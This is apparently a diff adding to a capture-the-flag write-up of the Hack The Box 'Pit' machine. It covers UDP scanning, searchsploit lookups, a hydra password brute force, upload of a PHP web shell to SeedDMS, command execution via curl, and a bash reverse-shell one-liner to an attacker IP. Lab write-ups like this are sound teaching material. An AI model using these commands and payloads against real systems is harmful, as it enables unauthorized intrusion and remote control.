@@ -39,7 +39,7 @@ layout: default
     
     <li>This box also required scanning UDP.  Here are the results of that scan below.</li>
     
-    <pre></pre>
+    <pre># Nmap 7.91 scan initiated Fri Nov 19 11:57:43 2021 as: nmap -sU -sV -oN ping_udp 10.129.95.189&#13;&#10;Nmap scan report for dms-pit.htb (10.129.95.189)&#13;&#10;Host is up (0.038s latency).&#13;&#10;Not shown: 900 filtered ports, 99 open|filtered ports&#13;&#10;PORT    STATE SERVICE VERSION&#13;&#10;161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)&#13;&#10;Service Info: Host: pit.htb&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Fri Nov 19 12:14:27 2021 -- 1 IP address (1 host up) scanned in 1004.59 seconds</pre>
     
     <br>
     <h2><a id="infogather">Information Gathering</a></h2>
@@ -62,7 +62,42 @@ layout: default
         <li>I check http://10.129.95.189 and it is just a default nginx splash page.  I also run gobuster against it as well as check for http://10.129.95.189/seeddms51x/seeddms but do not find anything.</li>
         <li>Next I check http://dms-pit.htb and I get a "403 Forbidden" page.  Checking http://dms-pit.htb/seeddms51x/seeddms I find that SeedDMS is running.</li>
         <li>Moving to port 9090 I check https://10.129.95.189:9090 and find a service running for CentOS Linux.  Reading the source code on this page reveals text like "This web browser is too old to run Cockpit" which leads me to believe the service is named Cockpit.</li>
+        <li>https://dms-pit.htb:9090/ reveals the same web page as https://10.129.95.189:9090</li>
     </ul>
+
+    <li>At this point I use searchsploit see what exploits exist for both seeddms and cockpit.</li>
+
+    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit seeddms &#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10; Exploit Title                                                                     |  Path&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)                    | php/webapps/50062.py&#13;&#10;SeedDMS 5.1.18 - Persistent Cross-Site Scripting                                   | php/webapps/48324.txt&#13;&#10;SeedDMS &lt; 5.1.11 - &apos;out.GroupMgr.php&apos; Cross-Site Scripting                         | php/webapps/47024.txt&#13;&#10;SeedDMS &lt; 5.1.11 - &apos;out.UsrMgr.php&apos; Cross-Site Scripting                           | php/webapps/47023.txt&#13;&#10;SeedDMS versions &lt; 5.1.11 - Remote Command Execution                               | php/webapps/47022.txt&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Shellcodes: No Results&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit cockpit&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10; Exploit Title                                                                     |  Path&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Cockpit CMS 0.11.1 - &apos;Username Enumeration &amp; Password Reset&apos; NoSQL Injection       | multiple/webapps/50185.py&#13;&#10;Cockpit CMS 0.4.4 &lt; 0.5.5 - Server-Side Request Forgery                            | php/webapps/44567.txt&#13;&#10;Cockpit CMS 0.6.1 - Remote Code Execution                                          | php/webapps/49390.txt&#13;&#10;Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)                | multiple/webapps/49397.txt&#13;&#10;openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery                                 | php/webapps/47305.py&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Shellcodes: No Results</pre>
+
+    <li>I find there are authenticated remote code execution exploits for both services.  I setup hydra to brute force passwords against seeddms using michelle as the user.</li>
+
+    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ hydra dms-pit.htb http-post-form -l michelle -P /usr/share/wordlists/rockyou.txt &quot;/seeddms51x/seeddms/op/op.Login.php:login=^USER^&amp;pwd=^PASS^&amp;lang=:incorrect&quot;         &#13;&#10;Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).&#13;&#10;&#13;&#10;Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-19 11:59:42&#13;&#10;[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task&#13;&#10;[DATA] attacking http-post-form://dms-pit.htb:80/seeddms51x/seeddms/op/op.Login.php:login=^USER^&amp;pwd=^PASS^&amp;lang=:incorrect&#13;&#10;[80][http-post-form] host: dms-pit.htb   login: michelle   password: michelle&#13;&#10;1 of 1 target successfully completed, 1 valid password found&#13;&#10;Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-19 11:59:46&#13;&#10;</pre>
+
+    <li>I quickly find the password is michelle.  This would have been easy to guess.  With authentication to seeddms I take a closer look at the RCE exploit.  I download php/webapps/47022.txt from searchsploit.  It basically says I can upload a php reverse shell and access it in the location /data/1048576/"document_id"/1.php.  After logging in to http://dms-pit.htb/seeddms51x/seeddms with the credentials michelle:michelle I start poking around to see where I can upload the document.  I find in the directory Docs/Users/Michelle/ I get access to the menu that contains the option to "Add document".</li>
+
+    <img src="../images/pit/seeddms.png">
+
+    <br>
+    <br>
+
+    <li>Now I create a web shell file named shell.php and contains: <code>&lt;?php system($_REQUEST[&apos;cmd&apos;]) ?&gt;</code>.  With that file created on my kali machine I go to the "Add document" option, scroll down to the line that says "Local file:", then click on "Browse...".  I select the shell.php file from my kali machine.  Then scroll to the bottom of the page and select "Add document".  The file should be uploaded now.</li>
+
+    <img src="../images/pit/shell_uploaded.png">
+
+    <br>
+    <br>
+
+    <li>The exploit requires us to find the document ID for the shell file we uploaded.  By scrolling over the shell.php file link the tooltip pops up on the bottom of the web browser revealing the link "http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=29&showtree=1" which contains the document id of 29.  Using the directory given by the exploit I use curl and run the command <code>id</code>.</li>
+
+    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ curl http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=id&#13;&#10;uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0&#13;&#10;</pre>
+
+    <li>We now have RCE.  The shell.php file gets deleted every so often, maybe every 10 minutes.  So I interecept the web request to upload the file with Burp and send that request to repeater.  That way I can easily upload the file again using burp.  Keep in mind each time you reupload shell.php it will have a different document id that you must upadte in your exploit command.  I also make the web request to http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=id using firefox and intercept that with burp as well and send the web request to repeater.  It is easier to url encode and send commands this way than with curl.</li>
+
+    <br>
+
+    <li>Now I setup a netcat listener on port 4444 and then send the command: <code>bash -c 'bash -i >& /dev/tcp/10.10.14.77/4444 0>&1'</code> using burp.  I have this command url encoded in burp.  In order to do this, you highlight the command and press <code>ctrl + u</code>.</li>
+
+
     
     <br>
     <h2><a id="???">Shell - ???</a></h2>
